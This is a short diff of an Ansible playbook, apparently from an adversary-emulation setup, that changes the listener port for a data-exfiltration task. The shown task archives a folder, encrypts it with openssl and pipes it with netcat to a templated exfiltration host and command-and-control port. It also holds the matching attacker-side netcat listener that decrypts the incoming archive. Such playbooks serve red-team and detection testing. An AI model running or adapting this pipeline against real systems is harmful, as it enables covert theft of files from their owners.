@@ -20,7 +20,7 @@
       shell: |
         echo skipping
         tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | nc -w1 {{ exfil_fqdn }} {{ cnc_port }}
-        attacker: nc -lp {{ exfil_port }} | openssl aes-256-cbc -d -k $pass {{ password_encryption }} > {{ exfiltration_file }}-ssl.tar.gz.enc
+        attacker: nc -lp {{ cnc_port }} | openssl aes-256-cbc -d -k $pass {{ password_encryption }} > {{ exfiltration_file }}-ssl.tar.gz.enc
     - name: Create Archive File
       archive:
         path: "{{ exfiltration_folder }}/*"
